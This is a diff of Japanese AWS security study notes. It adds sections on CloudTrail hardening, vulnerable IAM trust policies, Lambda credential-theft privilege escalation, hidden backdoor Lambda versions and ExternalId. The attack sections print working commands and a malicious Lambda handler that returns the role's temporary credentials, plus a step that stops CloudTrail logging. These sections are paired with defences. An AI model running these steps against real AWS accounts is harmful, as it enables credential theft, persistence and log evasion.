@@ -118,6 +118,55 @@ aws cloudtrail stop-logging --name all-events --region us-east-1 --profile targe
 
 ---
 
+### 2.2.1 CloudTrail Trailの適切なセットアップ（防御側ベストプラクティス）
+
+Trail設定は「作ればよい」ではなく、**何を記録するか**と**保護方法**が重要。2 Trail構成が推奨。
+
+**推奨構成（2 Trail構成）:**
+
+```bash
+# Trail 2（監査専用）: 管理・データ・Insightsイベントを全記録
+aws cloudtrail create-trail \
+  --name all-events-02 \
+  --s3-bucket-name <second-trail-bucket-name> \
+  --include-global-service-events \
+  --is-multi-region-trail \
+  --enable-log-file-validation \
+  --kms-key-id alias/cloudtrail-all-events-02
+
+# S3オブジェクトレベル・Bedrockモデル呼び出しのデータイベントも記録
+aws cloudtrail put-event-selectors \
+  --trail-name all-events-02 \
+  --advanced-event-selectors '[
+    {"Name":"S3","FieldSelectors":[
+      {"Field":"eventCategory","Equals":["Data"]},
+      {"Field":"resources.type","Equals":["AWS::S3::Object"]}
+    ]},
+    {"Name":"Bedrock","FieldSelectors":[
+      {"Field":"eventCategory","Equals":["Data"]},
+      {"Field":"resources.type","Equals":["AWS::Bedrock::Model"]}
+    ]}
+  ]'
+
+# Insights（APIコールレート・エラーレートの異常検知）を有効化
+aws cloudtrail put-insight-selectors \
+  --trail-name all-events-02 \
+  --insight-selectors '[{"InsightType":"ApiCallRateInsight"},{"InsightType":"ApiErrorRateInsight"}]'
+
+aws cloudtrail start-logging --name all-events-02
+```
+
+**複数Trailの使い分け:**
+
+| Trail | 用途 | 保護 |
+|-------|------|------|
+| `all-events` | 通常監査用（攻撃対象になりうる） | 標準設定 |
+| `all-events-02` | インシデント調査専用（常時有効） | S3 Object Lock（90日GOVERNANCE保持） |
+
+**S3 Object Lockの有効化:** バケット作成時に `--object-lock-enabled-for-bucket` を指定する（後からの有効化は不可）。
+
+---
+
 ### 2.3 バックドアIAMユーザー作成
 
 **攻撃シナリオ:**
@@ -297,7 +346,57 @@ merged_df.iloc[0].to_dict()
 
 ## 3. IAMロールの誤設定と権限昇格（Chapter 5）
 
-### 3.1 AssumeRoleを悪用した権限昇格
+### 3.1 IAMロール信頼ポリシー（Trust Policy）の脆弱パターン集
+
+Trust Policyの誤設定はAssumeRole悪用の根本原因となる。代表的な脆弱パターンと修正版を対比で示す。
+
+#### パターン1: ワイルドカードPrincipalで任意エンティティを許可
+
+```json
+// 脆弱: "AWS":"*" でインターネット上の任意AWSエンティティがAssumeRole可能（Conditionがあっても不完全な条件は回避される）
+{"Statement":[{"Effect":"Allow","Principal":{"AWS":"*"},"Action":"sts:AssumeRole"}]}
+
+// 修正: 特定のサービスプリンシパルのみ許可
+{"Statement":[{"Effect":"Allow","Principal":{"Service":"lambda.amazonaws.com"},"Action":"sts:AssumeRole"}]}
+```
+
+#### パターン2: 不完全な `aws:PrincipalArn` 条件
+
+デバッグ用途でLambdaと開発者が同一ロールを共有する構成でよく発生する。
+
+```json
+// 脆弱: user/* でアカウント内の全IAMユーザーがAssumeRole可能
+{
+  "Statement": [
+    {"Effect":"Allow","Principal":{"Service":"lambda.amazonaws.com"},"Action":"sts:AssumeRole"},
+    {
+      "Effect": "Allow",
+      "Principal": { "AWS": "*" },
+      "Action": "sts:AssumeRole",
+      "Condition": {"StringLike": {"aws:PrincipalArn": "arn:aws:iam::<ACCOUNT_ID>:user/*"}}
+    }
+  ]
+}
+```
+
+問題点:
+- `user/*` でアカウント内の**全IAMユーザー**がAssumeRole可能（特定ユーザーを限定できていない）
+- `AWSLambda_FullAccess` + `sts:AssumeRole` を持つ開発者グループがあれば昇格が成立
+- 攻撃者は `lambda:list-functions` でロールARNを特定 → そのまま AssumeRole を実行
+
+**修正:** 明示ARN（`arn:aws:iam::<ACCOUNT_ID>:user/SpecificUser`）で指定。ワイルドカード禁止。
+
+#### パターン3: サービスプリンシパルとIAMプリンシパルの混在リスク
+
+LambdaとIAMユーザーで同一ロールを共有すると、ユーザーアカウントの侵害でLambda実行権限も奪われる。
+
+**推奨アーキテクチャ:**
+- Lambda実行ロールとデバッグ用ロールを**完全分離**する
+- デバッグ用ロールへのAssumeRoleには `"aws:MultiFactorAuthPresent": "true"` 条件を必須化
+
+---
+
+### 3.1.5 AssumeRoleを悪用した権限昇格（実際の攻撃フロー）
 
 **攻撃シナリオ:**
 低権限開発者アカウント（`Developer001`）の認証情報を取得 → `sts:AssumeRole` 権限を持つ → 過剰な権限を持つIAMロール（`AdministratorAccess`）を引き受け → 権限昇格
@@ -385,32 +484,32 @@ aws iam list-attached-role-policies --role-name lambda-assumable-role --profile 
 
 ---
 
-### 3.2 過剰な権限を持つLambda実行ロール経由の権限昇格
+### 3.2 Lambda関数コード改変攻撃（UpdateFunctionCode悪用）
 
 **攻撃シナリオ:**
 開発者アカウントが `lambda:UpdateFunctionCode` 権限を持つ → Lambda関数コードを改変して実行ロールの一時認証情報を返すコードを挿入 → 関数を呼び出して認証情報を取得 → 権限昇格
 
-**攻撃手順:**
+**攻撃チェーン（ステップ形式）:**
+
+1. `aws lambda list-functions` でロールARN（`lambda-assumable-role`）を特定
+2. `aws lambda get-function` でコードダウンロードURL（`Code.Location`）を取得
+3. `curl` でZIPダウンロード → `unzip` で解凍 → 元のコードを確認
+4. 悪意あるコード（boto3で実行ロールの認証情報を返す）に置き換え
+5. `aws lambda update-function-code` で再デプロイ
+6. `aws lambda wait function-updated` でデプロイ完了を待機（必須）
+7. `aws lambda invoke --qualifier '$LATEST'` で関数呼び出し → 一時認証情報を取得
+8. 取得した `AccessKeyId/SecretAccessKey/SessionToken` でCLIプロファイル設定 → 権限昇格完了
+
+**悪意あるコード（Step 4）:**
 
 ```bash
-# Lambda関数コードをダウンロード
-CODE_LOCATION=$(aws lambda get-function \
-    --function-name lambda-0000 \
-    --region us-east-1 \
-    --profile target-dev-account \
-    | jq -r ".Code.Location")
-
-curl -o function.zip "$CODE_LOCATION"
-unzip function.zip -d lambda-0000
-
-# 悪意あるコードに置き換え
+# 元のコードを悪意あるコードに置き換え
 cat > lambda-0000/lambda_function.py <<'EOF'
 import boto3
 
 def lambda_handler(event, context):
     session = boto3.Session()
     credentials = session.get_credentials().get_frozen_credentials()
-
     return {
         'AccessKeyId': credentials.access_key,
         'SecretAccessKey': credentials.secret_key,
@@ -419,84 +518,129 @@ def lambda_handler(event, context):
 EOF
 
 # 再パッケージ・デプロイ
-cd lambda-0000
-zip -r ../function-new.zip .
+cd ~/lambda-0000 && zip -r ../function-new.zip .
 aws lambda update-function-code \
   --function-name lambda-0000 \
   --zip-file fileb://../function-new.zip \
   --region us-east-1 \
   --profile target-dev-account
 
-aws lambda wait function-updated --function-name lambda-0000 --region us-east-1 --profile target-dev-account
+aws lambda wait function-updated \
+  --function-name lambda-0000 --region us-east-1 --profile target-dev-account
 
-# 一時認証情報を取得
+# 実行ロールの一時認証情報を取得
 aws lambda invoke \
-  --function-name lambda-0000 \
-  --payload '{}' \
-  --region us-east-1 \
-  --qualifier '$LATEST' \
-  --profile target-dev-account \
-  output_response.json
+  --function-name lambda-0000 --payload '{}' \
+  --region us-east-1 --qualifier '$LATEST' \
+  --profile target-dev-account output_response.json
 
 cat output_response.json
-# {"AccessKeyId": "...", "SecretAccessKey": "...", "SessionToken": "..."}
+# {"AccessKeyId": "ASIA...", "SecretAccessKey": "...", "SessionToken": "..."}
 ```
+
+**重要:** `lambda:UpdateFunctionCode` 権限単体で、Lambda実行ロールの全権限を引き継げる。
 
 **防御策:**
 
-- ✅ **Lambdaに最小権限のExecution Roleを設定**
+- ✅ **Lambdaに最小権限のExecution Roleを設定**（`AdministratorAccess` は絶対禁止）
 - ✅ **lambda:UpdateFunctionCode** は本番環境では開発者から削除
 - ✅ **Lambda関数バージョン管理**: 誰がいつコードを変更したかを追跡
 - ✅ **Lambda Layer Verification**: 改ざんされていないLayerのみ許可
 - ✅ **AWS Config Rule**: `lambda-function-settings-check` で設定を監査
+- ✅ **CloudTrail監視**: `UpdateFunctionCode` イベントを検知してアラート発報
 
 ---
 
-### 3.3 バックドアLambdaバージョンの作成
+### 3.3 バックドアLambdaバージョンの作成と詳細管理
 
 **攻撃シナリオ:**
 一時的にmalicious codeをデプロイ → `lambda:PublishVersion` で固定バージョンを作成 → 元のコードに戻す → 過去のバージョンは残存（`--qualifier 2` で呼び出し可能） → 永続的バックドア
 
-**攻撃手順:**
+#### Lambdaバージョン管理の仕組み（$LATEST vs 版番号）
+
+| 概念 | 特徴 |
+|------|------|
+| `$LATEST` | 常に最新デプロイを指す。コード変更が即反映。本番利用は非推奨 |
+| 版番号（`1`, `2`, `3`...） | `PublishVersion` で作成するイミュータブルなスナップショット |
+| エイリアス | バージョンまたは `$LATEST` への名前付きポインタ（`--qualifier prod` 等） |
 
 ```bash
-# 悪意あるコードをバージョン2として公開
+# 全バージョンの一覧と各コードSHA256ハッシュを確認
+aws lambda list-versions-by-function \
+  --function-name lambda-0000 --region us-east-1 --profile admin-001 \
+  | jq '.Versions[] | {Version, CodeSha256, LastModified}'
+```
+
+**攻撃手順（バックドア版の作成から隠蔽まで）:**
+
+```bash
+# 悪意あるコードをデプロイ済みの状態でバージョン2として固定
 aws lambda publish-version --function-name lambda-0000 --region us-east-1 --profile admin-001
 
-# 元のコードに戻してバージョン3を公開
+# 元のコードに戻してバージョン3を公開（バックドアを隠蔽）
 aws lambda update-function-code \
-  --function-name lambda-0000 \
-  --zip-file fileb://../function.zip \
-  --region us-east-1 \
-  --profile admin-001
-
+  --function-name lambda-0000 --zip-file fileb://../function.zip --region us-east-1 --profile admin-001
 aws lambda wait function-updated --function-name lambda-0000 --region us-east-1 --profile admin-001
 aws lambda publish-version --function-name lambda-0000 --region us-east-1 --profile admin-001
 
-# バージョン一覧確認
-aws lambda list-versions-by-function --function-name lambda-0000 --query 'Versions[].Version' --output text --region us-east-1 --profile admin-001
-# $LATEST 1 2 3
+# バージョン一覧（$LATEST、1、2、3が存在 - コンソールの「Code」タブは$LATESTのみ表示）
+aws lambda list-versions-by-function \
+  --function-name lambda-0000 --query 'Versions[].Version' --output text --region us-east-1 --profile admin-001
+# $LATEST  1  2  3
 
-# バージョン2（悪意あるコード）を直接呼び出し
+# バージョン2（悪意あるコード）を直接呼び出し → 認証情報を取得
 aws lambda invoke \
-  --function-name lambda-0000 \
-  --payload '{}' \
-  --region us-east-1 \
-  --qualifier '2' \
-  --profile admin-001 \
-  output_response.json
-
-cat output_response.json
-# {"AccessKeyId": "...", "SecretAccessKey": "...", "SessionToken": "..."}
+  --function-name lambda-0000 --payload '{}' \
+  --region us-east-1 --qualifier '2' --profile admin-001 output_response.json
+cat output_response.json  # {"AccessKeyId": "...", "SecretAccessKey": "...", "SessionToken": "..."}
 ```
+
+**重要なポイント:**
+- `$LATEST` 版は常に上書きされるが、版番号は永続する
+- Lambda コンソールの「Code」タブは `$LATEST` を表示 → バックドア版は隠蔽される
+- 版番号は昇順で自動付番 → 再利用不可
+- 版番号指定での呼び出しは、Aliasを使えばFunction URL経由でも実行可能
 
 **防御策:**
 
 - ✅ **Lambda Function URL のアクセス制御**: 未認証アクセスを禁止
 - ✅ **古いLambdaバージョンの定期削除**: 本番で使用していないバージョンを削除
 - ✅ **AWS Config Rule (Custom)**: 未使用バージョンの検出
-- ✅ **EventBridge Rule**: `lambda:PublishVersion` イベントを監視
+- ✅ **EventBridge Rule**: `lambda:PublishVersion` / `lambda:UpdateFunctionCode` イベントを監視
 - ✅ **Service Control Policy**: 本番環境で `lambda:CreateFunctionUrlConfig` を制限
+- ✅ **Versions/Aliasesタブ定期監査**: コンソールではなくCLIで全バージョンのCodeSHA256を検証
+
+---
+
+### 3.4 ExternalIdによるクロスアカウントAssumeRoleのセキュア化
+
+**混乱した代理人（Confused Deputy）問題:**
+サードパーティが複数顧客の代理でAssumeRoleを実行する場合、悪意ある顧客BがロールARNのみで他顧客AのロールをAssumeRoleできてしまう問題。
+
+```json
+// 安全: ExternalIdを必須条件として追加（顧客ごとに一意のランダム値）
+{
+  "Statement": [{
+    "Effect": "Allow",
+    "Principal": {"AWS": "arn:aws:iam::<THIRD_PARTY_ACCOUNT_ID>:root"},
+    "Action": "sts:AssumeRole",
+    "Condition": {"StringEquals": {"sts:ExternalId": "<UNIQUE_UUID_PER_CUSTOMER>"}}
+  }]
+}
+```
+
+```bash
+# 呼び出し側: ExternalIdを指定してAssumeRole
+aws sts assume-role \
+  --role-arn arn:aws:iam::<TARGET_ACCOUNT_ID>:role/cross-account-role \
+  --external-id <UNIQUE_EXTERNAL_ID> \
+  --role-session-name cross-account-session
+```
+
+**防御策:**
+- ✅ クロスアカウントAssumeRoleには `sts:ExternalId` 条件を必須設定
+- ✅ ExternalIdは顧客ごとに**一意のUUID**を使用（連番や推測可能な値は危険）
+- ✅ ExternalIdはサードパーティとの安全なチャネルで共有する
 
 ---
 
